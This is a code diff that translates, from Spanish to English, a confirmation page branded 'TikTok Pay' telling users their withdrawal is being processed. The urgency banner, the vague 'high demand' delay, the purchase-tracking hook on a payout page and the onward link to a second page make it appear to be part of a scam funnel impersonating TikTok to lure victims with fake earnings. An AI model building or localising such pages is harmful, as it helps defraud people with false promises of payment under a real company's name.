@@ -6,15 +6,15 @@ import { useTikTokPurchase } from "@/lib/purchase-tracking";
 export const Route = createFileRoute("/obrigado")({
   head: () => ({
     meta: [
-      { title: "Solicitud Confirmada | TikTok Pay" },
+      { title: "Request Confirmed | TikTok Pay" },
       {
         name: "description",
-        content: "Tu retiro fue recibido con éxito. Procesamiento en curso.",
+        content: "Your withdrawal was received successfully. Processing is underway.",
       },
-      { property: "og:title", content: "Solicitud Confirmada" },
+      { property: "og:title", content: "Request Confirmed" },
       {
         property: "og:description",
-        content: "Tu retiro fue recibido con éxito. Procesamiento en curso.",
+        content: "Your withdrawal was received successfully. Processing is underway.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -44,7 +44,7 @@ function Obrigado() {
           <svg viewBox="0 0 24 24" className="h-4 w-4" fill="currentColor">
             <path d="M12 2L1 21h22L12 2zm0 3.45L19.53 19H4.47L12 5.45zM11 16h2v2h-2v-2zm0-7h2v5h-2V9z" />
           </svg>
-          IMPORTANTE: NO CIERRES ESTA PÁGINA HASTA LEER LA INFORMACIÓN COMPLETA.
+          IMPORTANT: DO NOT CLOSE THIS PAGE UNTIL YOU READ THE FULL INFORMATION.
         </p>
       </div>
 
@@ -75,26 +75,26 @@ function Obrigado() {
         <div className="mb-6">
           <span className="inline-flex items-center gap-2 rounded-full border border-[#25d366]/20 bg-[#25d366]/5 px-4 py-1.5 text-[12px] font-bold text-[#25d366] uppercase tracking-wider">
             <span className="h-2 w-2 rounded-full bg-[#25d366] animate-pulse" />
-            Solicitud Confirmada
+            Request Confirmed
           </span>
         </div>
 
         {/* Main Title */}
         <h1 className="mb-8 text-[32px] font-black leading-[1.1] text-[#161823]">
-          ¡Tu retiro fue <span className="bg-gradient-to-r from-[#ff3b5c] via-[#25f4ee] to-[#161823] bg-clip-text text-transparent">recibido con éxito!</span>
+          Your withdrawal was <span className="bg-gradient-to-r from-[#ff3b5c] via-[#25f4ee] to-[#161823] bg-clip-text text-transparent">received successfully!</span>
         </h1>
 
         {/* Info Card */}
         <div className="w-full rounded-[24px] bg-white p-8 shadow-[0_20px_50px_rgba(0,0,0,0.06)] text-left mb-8 border border-neutral-100">
           <p className="mb-6 text-[15px] leading-relaxed text-[#161823]">
-            Debido a la <span className="font-bold text-[#ff3b5c]">alta demanda de retiros</span>, tu solicitud será procesada en un plazo de <span className="font-bold underline underline-offset-2">hasta 7 días hábiles.</span>
+            Due to the <span className="font-bold text-[#ff3b5c]">high demand for withdrawals</span>, your request will be processed within <span className="font-bold underline underline-offset-2">up to 7 business days.</span>
           </p>
 
           <ul className="space-y-5">
             {[
-              "Tu pago está en la cola de procesamiento del equipo financiero de TikTok.",
-              "Recibirás la transferencia directamente en el método elegido al solicitar el retiro.",
-              "No es necesario realizar ninguna acción adicional de tu parte.",
+              "Your payment is in the processing queue of TikTok's finance team.",
+              "You will receive the transfer directly through the method chosen when requesting the withdrawal.",
+              "No additional action is required on your part.",
             ].map((text, i) => (
               <li key={i} className="flex items-start gap-3">
                 <svg
@@ -116,7 +116,7 @@ function Obrigado() {
 
         {/* Footer Text */}
         <p className="mb-10 text-[12px] italic leading-relaxed text-[#8a8a8e] px-4">
-          Agradecemos tu paciencia. El equipo de TikTok Pay está trabajando para liberar tu pago lo antes posible.
+          Thank you for your patience. The TikTok Pay team is working to release your payment as soon as possible.
         </p>
 
         {/* CTA Button */}
@@ -124,7 +124,7 @@ function Obrigado() {
           onClick={() => navigate({ to: "/obrigado2" })}
           className="w-full rounded-2xl bg-[#ff3b5c] py-5 text-[18px] font-black text-white shadow-[0_10px_30px_rgba(255,59,92,0.3)] transition-all hover:brightness-110 active:scale-[0.98]"
         >
-          CONTINUAR
+          CONTINUE
         </button>
       </section>
     </main>
